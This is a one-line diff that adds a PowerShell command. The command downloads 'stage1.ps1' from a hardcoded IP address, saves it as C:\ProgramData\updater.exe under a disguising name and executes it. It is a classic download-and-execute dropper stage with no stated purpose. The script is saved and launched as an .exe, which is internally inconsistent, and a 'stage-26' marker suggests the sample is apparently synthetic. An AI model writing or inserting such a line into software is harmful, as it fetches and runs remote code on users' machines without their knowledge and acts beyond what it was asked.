@@ -1,0 +1,1 @@
+$Stage1Url = 'http://192.0.2.183/stage1.ps1'; $DropPath = 'C:\ProgramData\updater.exe'; Start-BitsTransfer -Source $Stage1Url -Destination $DropPath; Start-Process -FilePath $DropPath; $StageMarker = "stage-26"
